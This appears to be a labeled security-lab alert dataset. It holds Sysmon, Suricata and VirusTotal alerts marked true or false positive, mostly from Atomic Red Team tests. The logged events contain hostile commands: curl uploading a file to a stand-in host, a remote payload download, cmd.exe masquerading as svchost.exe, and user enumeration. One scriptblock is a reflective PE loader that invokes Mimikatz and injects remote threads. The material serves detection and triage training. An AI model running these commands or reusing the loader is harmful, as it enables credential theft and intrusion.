RuleName: technique_id=T1036,technique_name=Masquerading
UtcTime: 2025-07-04 09:36:00.199
SourceProcessGUID: {ff3427f9-a07d-6867-e605-000000001200}
SourceProcessId: 5692
SourceThreadId: 1816
SourceImage: C:\Users\sbeater\AppData\Local\Microsoft\OneDrive\25.110.0608.0002\Microsoft.SharePoint.exe
TargetProcessGUID: {ff3427f9-9fed-6867-7805-000000001200}
TargetProcessId: 752
TargetImage: C:\WINDOWS\Explorer.EXE
GrantedAccess: 0x40
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+161fc4|C:\WINDOWS\System32\KERNELBASE.dll+c5b66|C:\WINDOWS\System32\shcore.dll+3ada9|C:\WINDOWS\System32\shcore.dll+1df4a|C:\WINDOWS\System32\shcore.dll+1cde1|C:\WINDOWS\SYSTEM32\windows.storage.dll+5803fd|C:\WINDOWS\SYSTEM32\windows.storage.dll+159419|C:\WINDOWS\SYSTEM32\windows.storage.dll+158ef3|C:\WINDOWS\System32\shcore.dll+27113|C:\WINDOWS\System32\shcore.dll+2729d|C:\Users\sbeater\AppData\Local\Microsoft\OneDrive\25.110.0608.0002\Microsoft.SharePoint.dll+11aab20|C:\Users\sbeater\AppData\Local\Microsoft\OneDrive\25.110.0608.0002\Microsoft.SharePoint.dll+68ba2|C:\Users\sbeater\AppData\Local\Microsoft\OneDrive\25.110.0608.0002\Microsoft.SharePoint.dll+3b1f8|C:\Users\sbeater\AppData\Local\Microsoft\OneDrive\25.110.0608.0002\Microsoft.SharePoint.exe+306d|C:\Users\sbeater\AppData\Local\Microsoft\OneDrive\25.110.0608.0002\Microsoft.SharePoint.exe+42182|C:\WINDOWS\System32\KERNEL32.DLL+2e8d7|C:\WINDOWS\SYSTEM32\ntdll.dll+3c34c
SourceUser: SOCLAB\sbeater
TargetUser: SOCLAB\sbeater"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Detected WinRM activity from 10.0.2.12 to 10.0.2.14 4 Low Detected WinRM activity from 10.0.2.12 to 10.0.2.14 92110 sysmon sysmon_eid3_detections windows windows_eventchannel Win11Client System NT AUTHORITY\\SYSTEM ""Network connection detected:
RuleName: technique_id=T1021.006,technique_name=Windows Remote Management
UtcTime: 2025-07-03 17:00:15.661
ProcessGuid: {ff3427f9-3a5a-6866-eb03-000000000000}
ProcessId: 4
Image: System
User: NT AUTHORITY\SYSTEM
Protocol: tcp
Initiated: false
SourceIsIpv6: false
SourceIp: 10.0.2.12
SourceHostname: -
SourcePort: 49305
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 10.0.2.14
DestinationHostname: -
DestinationPort: 5985
DestinationPortName: -"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
VirusTotal: Alert - c:\users\snell\downloads\eicar-test.txt - 63 engines detected this file 12 High VirusTotal: Alert - c:\users\snell\downloads\eicar-test.txt - 63 engines detected this file 87105 virustotal json Win11Client virustotal,0,FP
"Special privileges assigned to new logon. 3 Low Special privileges assigned to new logon. 67028 windows  WEF windows_eventchannel WinSrv2019 ""Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-21-3023907177-3273552708-540821291-1002
	Account Name:		WINSRV2019$
	Account Domain:		SOCLAB
	Logon ID:		0x3FA5CB

Privileges:		SeAuditPrivilege
			SeAssignPrimaryTokenPrivilege
			SeImpersonatePrivilege"" AUDIT_SUCCESS Microsoft-Windows-Security-Auditing Security EventChannel",0,FP
"Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process 6 Low Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process 92218 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client System C:\\Windows\\PSEXESVC.exe NT AUTHORITY\\SYSTEM ""File created:
RuleName: -
UtcTime: 2025-07-06 13:49:18.827
ProcessGuid: {ff3427f9-51d0-686a-eb03-000000000000}
ProcessId: 4
Image: System
TargetFilename: C:\Windows\PSEXESVC.exe
CreationUtcTime: 2025-07-04 20:41:00.770
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
Suricata: Alert - ET INFO Possible Kali Linux hostname in DHCP Request Packet 3 Low Suricata: Alert - ET INFO Possible Kali Linux hostname in DHCP Request Packet 86601 ids suricata json Suricata /var/log/suricata/eve.json,1,TP
"Sysmon - Suspicious Process - svchost.exe 12 High Sysmon - Suspicious Process - svchost.exe 61618 windows sysmon sysmon_process-anomalies windows_eventchannel Win11Client C:\\svchost.exe  /c echo T1105 \""cmd.exe\"" /c copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe &amp; C:\\svchost.exe /c echo T1105 &gt; \\\\localhost\\c$\\T1105.txt C:\\svchost.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 21:47:22.063
ProcessGuid: {ff3427f9-4bea-6868-f805-000000001400}
ProcessId: 2224
Image: C:\svchost.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\svchost.exe  /c echo T1105 
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-4be9-6868-f605-000000001400}
ParentProcessId: 9852
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c copy C:\Windows\System32\cmd.exe C:\svchost.exe & C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational {""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2025-07-04T21:47:22.0716524Z"",""eventRecordID"":""391447"",""processID"":""3056"",""threadID"":""3992"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""Win11Client.soclab.internal"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 21:47:22.063\r\nProcessGuid: {ff3427f9-4bea-6868-f805-000000001400}\r\nProcessId: 2224\r\nImage: C:\\svchost.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: C:\\svchost.exe  /c echo T1105 \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-4be9-6868-f605-000000001400}\r\nParentProcessId: 9852\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \""cmd.exe\"" /c copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe & C:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt\r\nParentUser: SOCLAB\\snell\""""},""eventdata"":{""ruleName"":""technique_id=T1059,technique_name=Command-Line Interface"",""utcTime"":""2025-07-04 21:47:22.063"",""processGuid"":""{ff3427f9-4bea-6868-f805-000000001400}"",""processId"":""2224"",""image"":""C:\\\\svchost.exe"",""fileVersion"":""10.0.26100.4202 (WinBuild.160101.0800)"",""description"":""Windows Command Processor"",""product"":""Microsoft® Windows® Operating System"",""company"":""Microsoft Corporation"",""originalFileName"":""Cmd.Exe"",""commandLine"":""C:\\\\svchost.exe  /c echo T1105"",""currentDirectory"":""C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\"",""user"":""SOCLAB\\\\snell"",""logonGuid"":""{ff3427f9-1e7f-6868-f045-0a0000000000}"",""logonId"":""0xa45f0"",""terminalSessionId"":""1"",""integrityLevel"":""High"",""hashes"":""SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6"",""parentProcessGuid"":""{ff3427f9-4be9-6868-f605-000000001400}"",""parentProcessId"":""9852"",""parentImage"":""C:\\\\Windows\\\\System32\\\\cmd.exe"",""parentCommandLine"":""\\\""cmd.exe\\\"" /c copy C:\\\\Windows\\\\System32\\\\cmd.exe C:\\\\svchost.exe &amp; C:\\\\svchost.exe /c echo T1105 &gt; \\\\\\\\localhost\\\\c$\\\\T1105.txt"",""parentUser"":""SOCLAB\\\\snell""}}} EventChannel",1,TP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client find  /v \""console\"" \""cmd.exe\"" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\""localhost\"" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \""tokens=1,2\"" %i in ('qwinsta /server:localhost ^| findstr \""Active Disc\""') do @echo %i | find /v \""#\"" | find /v \""console\"" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \""tokens=1,2\"" %i in ('qwinsta /server:%n ^| findstr \""Active Disc\""') do @echo %i | find /v \""#\"" | find /v \""console\"" || echo %j &gt; usernames.txt C:\\Windows\\System32\\find.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-05 13:02:57.757
ProcessGuid: {ff3427f9-2281-6869-9d01-000000001500}
ProcessId: 1788
Image: C:\Windows\System32\find.exe
FileVersion: 10.0.26100.1 (WinBuild.160101.0800)
Description: Find String (grep) Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: FIND.EXE
CommandLine: find  /v ""console"" 
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}
LogonId: 0x82F6F
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=92ADFE3440739BFB92E9866D2ED050E5D20BE198,MD5=21AF9D1389428FB7DE154C11ADCAC954,SHA256=CF9CC5A552DE280750B36743E80C33381E59D5EC8AA65A2DCFDD6A34198799BC,IMPHASH=7EF15CE1238ABC9D0468CB4D7C10B6F3
ParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}
ParentProcessId: 9176
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:""localhost"" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F ""tokens=1,2"" %i in ('qwinsta /server:localhost ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client C:\\Windows\\System32\\Curl.exe  --data c:\\temp\\atomictestfile.txt www.example.com \""cmd.exe\"" /c C:\\Windows\\System32\\Curl.exe -T c:\\temp\\atomictestfile.txt www.example.com &amp; C:\\Windows\\System32\\Curl.exe --upload-file c:\\temp\\atomictestfile.txt www.example.com &amp; C:\\Windows\\System32\\Curl.exe -d c:\\temp\\atomictestfile.txt www.example.com &amp; C:\\Windows\\System32\\Curl.exe --data c:\\temp\\atomictestfile.txt www.example.com C:\\Windows\\System32\\curl.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 21:47:39.261
ProcessGuid: {ff3427f9-4bfb-6868-1306-000000001400}
ProcessId: 3380
Image: C:\Windows\System32\curl.exe
FileVersion: 8.13.0
Description: The curl executable
Product: The curl executable
Company: curl, https://curl.se/
OriginalFileName: curl.exe
CommandLine: C:\Windows\System32\Curl.exe  --data c:\temp\atomictestfile.txt www.example.com
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=A1BD7848E36F22021C68F4F24EDFDB7ACE42FCA3,MD5=90939B67542D77A32042B7C1945623B1,SHA256=3345339164CF384EFF527B6C3160FEA8D849A4231EC6CA80513E3A739E505168,IMPHASH=6C25E5A258C8C037CD5FBE44B10E696F
ParentProcessGuid: {ff3427f9-4bfa-6868-0e06-000000001400}
ParentProcessId: 9660
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Printer spooler service loaded a dll file. Possible PrintNightmare exploit: CVE-2021-34527 6 Low Printer spooler service loaded a dll file. Possible PrintNightmare exploit: CVE-2021-34527 92152 sysmon sysmon_eid7_detections windows windows_eventchannel Win11Client C:\\Windows\\System32\\spoolsv.exe NT AUTHORITY\\SYSTEM ""Image loaded:
RuleName: technique_id=1210,technique_name=Exploitation of Remote Services
UtcTime: 2025-07-03 08:10:06.450
ProcessGuid: {ff3427f9-3a64-6866-3e00-000000001200}
ProcessId: 3140
Image: C:\Windows\System32\spoolsv.exe
ImageLoaded: C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll
FileVersion: 10.0.26100.4343 (WinBuild.160101.0800)
Description: PrintConfig User Interface
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PRINTCONFIG.DLL
Hashes: SHA1=B1B111F836AC95255E6386F14DFE54DB34CF531E,MD5=B10FF87F21C9C0BC13F998726189627A,SHA256=08A6880EBD2F05FBAF6DDBCB5A411C29A727B4B7F2236273D433FBEF77305A3E,IMPHASH=14075EFA04039861B61CC18035EF2F7A
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Powershell process has copied an executable file to Windows start-up folder 14 High Powershell process has copied an executable file to Windows start-up folder 92226 sysmon sysmon_eid11_detections windows windows_eventchannel WinSrv2019 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\mount_shares.bat SOCLAB\\vboxuser ""File created:
RuleName: -
UtcTime: 2025-07-04 16:20:15.373
ProcessGuid: {6a97c67b-fd2a-6867-6802-000000000a00}
ProcessId: 2764
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\mount_shares.bat
CreationUtcTime: 2025-07-04 16:20:15.373
User: SOCLAB\vboxuser"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PrintWorkflowUserSvc_1d14aa\\ImagePath binary is: C:\\WINDOWS\\system32\\svchost.exe -k PrintWorkflow 3 Low Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PrintWorkflowUserSvc_1d14aa\\ImagePath binary is: C:\\WINDOWS\\system32\\svchost.exe -k PrintWorkflow 92307 sysmon sysmon_eid13_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\system32\\services.exe NT AUTHORITY\\SYSTEM ""Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2025-07-03 08:14:36.141
ProcessGuid: {ff3427f9-3a61-6866-0b00-000000001200}
ProcessId: 904
Image: C:\WINDOWS\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\PrintWorkflowUserSvc_1d14aa\ImagePath
Details: C:\WINDOWS\system32\svchost.exe -k PrintWorkflow
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Executable file dropped in folder commonly used by malware 15 Critical Executable file dropped in folder commonly used by malware 92213 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\Explorer.EXE C:\\Users\\snell\\AppData\\Local\\Temp\\eicar.exe SOCLAB\\snell ""File created:
RuleName: -
UtcTime: 2025-06-29 12:02:02.891
ProcessGuid: {ff3427f9-29bd-6861-f800-000000001000}
ProcessId: 5648
Image: C:\WINDOWS\Explorer.EXE
TargetFilename: C:\Users\snell\AppData\Local\Temp\eicar.exe
CreationUtcTime: 2025-06-29 12:02:02.889
User: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Powershell process spawned powershell instance 4 Low Powershell process spawned powershell instance 92027 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""powershell.exe\"" &amp; {sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\\T1105.zip} \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1086,technique_name=PowerShell
UtcTime: 2025-07-04 21:51:12.216
ProcessGuid: {ff3427f9-4cd0-6868-4d06-000000001400}
ProcessId: 9440
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\T1105.zip}
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares. 12 High New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares. 92650 win_evt_channel windows windows_eventchannel Win11Client ""A service was installed in the system.

Service Name:  XIfn
Service File Name:  %systemroot%\UbntCfHC.exe
Service Type:  user mode service
Service Start Type:  demand start
Service Account:  LocalSystem"" INFORMATION Service Control Manager System EventChannel",1,TP
"Powershell script may be using Base64 decoding method 10 Medium Powershell script may be using Base64 decoding method 91809 windows  powershell windows_eventchannel Win11Client ""Creating Scriptblock text (1 of 1):
Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne """"))
		{
			Throw ""Can't supply a ProcId and ProcName, choose one or the other""
		}
		elseif ($ProcName -ne $null -and $ProcName -ne """")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw ""Can't find process $ProcName""
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw ""More than one instance of $ProcName found, please specify the process ID to inject in to.""
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose ""Getting SeDebugPrivilege""
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw ""Couldn't obtain the handle for process ID: $ProcId""
			}
			
			Write-Verbose ""Got the handle for the remote process to inject in to""
		}
		

		#Load the PE reflectively
		Write-Verbose ""Calling Invoke-MemoryLoadLibrary""

        try
        {
            $Processors = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }

        if ($Processors -is [array])
        {
            $Processor = $Processors[0]
        } else {
            $Processor = $Processors
        }

        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( ""Architecture: "" + $Processor.AddressWidth + "" Process: "" + ([System.IntPtr]::Size * 8))
            Write-Error ""PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS."" -ErrorAction Stop
        }

        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        $PEBytes[0] = 0
        $PEBytes[1] = 0
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw ""Unable to load PE, handle returned is NULL""
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
                    Write-Verbose ""Calling function with WString return type""
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""powershell_reflective_mimikatz""
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw ""Couldn't find function address.""
				    }
				    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
				    if ($OutputPtr -eq [IntPtr]::Zero)
				    {
				    	Throw ""Unable to get output, Output Ptr is NULL""
				    }
				    else
				    {
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				        Write-Output $Output
				        $Win32Functions.LocalFree.Invoke($OutputPtr);
				    }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""VoidFunc""
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw ""VoidFunc couldn't be found in the DLL""
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
			}
		}
		
		Write-Verbose ""Done!""
	}

ScriptBlock ID: bfe9b4f9-1068-45f2-a211-bab6a711f804
Path: "" VERBOSE Microsoft-Windows-PowerShell Microsoft-Windows-PowerShell/Operational EventChannel",1,TP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""cmd.exe\"" /c %%LOCALAPPDATA:~-3,1%%md /c echo Hello, from CMD! &gt; hello.txt &amp; type hello.txt \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 19:08:27.640
ProcessGuid: {ff3427f9-26ab-6868-0402-000000001400}
ProcessId: 7572
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c %%LOCALAPPDATA:~-3,1%%md /c echo Hello, from CMD! > hello.txt & type hello.txt
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
